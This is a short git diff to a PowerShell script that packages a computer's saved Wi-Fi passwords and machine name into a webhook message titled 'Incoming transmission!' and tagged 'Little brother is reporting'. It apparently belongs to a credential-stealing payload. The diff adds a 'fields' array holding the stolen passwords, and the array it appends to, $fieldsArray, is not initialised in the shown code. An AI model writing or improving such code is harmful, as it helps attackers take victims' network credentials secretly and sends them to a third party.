@@ -22,18 +22,23 @@ param (
 
 [System.Collections.ArrayList]$embedArray = @()
 
-$building =  [PSCustomObject]@{
+$forEmbed =  [PSCustomObject]@{
     'title'       = 'Incoming transmission!'
     'description' = '[Saved Wifi Password - ' + $env:computername + '] ' + 'Little brother is reporting: ' + @($loggedwifis)
     'color'       = '16744960'
 }
 
-$embedArray.Add($building) | Out-Null
+$forFields = [PSCustomObject]@{
+    'value' = $loggedwifis
+}
+
+$embedArray.Add($ForEmbed) | Out-Null
+$fieldsArray.Add($forFields) | Out-Null
 
 $Body = [PSCustomObject]@{
 
     embeds = $embedArray
-
+    fields = $fieldsArray
 }
 
 if (-not ([string]::IsNullOrEmpty($text))){
